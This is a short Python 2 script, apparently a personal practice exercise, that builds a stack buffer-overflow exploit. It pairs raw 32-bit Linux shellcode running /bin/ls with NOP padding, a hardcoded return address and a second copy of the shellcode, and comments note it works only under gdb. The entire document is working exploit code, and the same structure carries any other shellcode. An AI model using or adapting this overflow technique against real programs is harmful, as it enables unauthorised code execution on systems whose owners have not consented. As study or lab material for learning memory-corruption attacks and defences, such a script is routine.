#!/usr/bin/python

# random sc: 
# ls current dir from within gdb, 
# need to fix for non-gdb?
sc = '\x31\xc0\x50\x68\x2f\x2fls\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'

# addr of shellcode
eip = '\x70\xfc\xff\xbf'

# add nops because sc
padded = sc.ljust(76, '\x90')

print padded + eip + sc
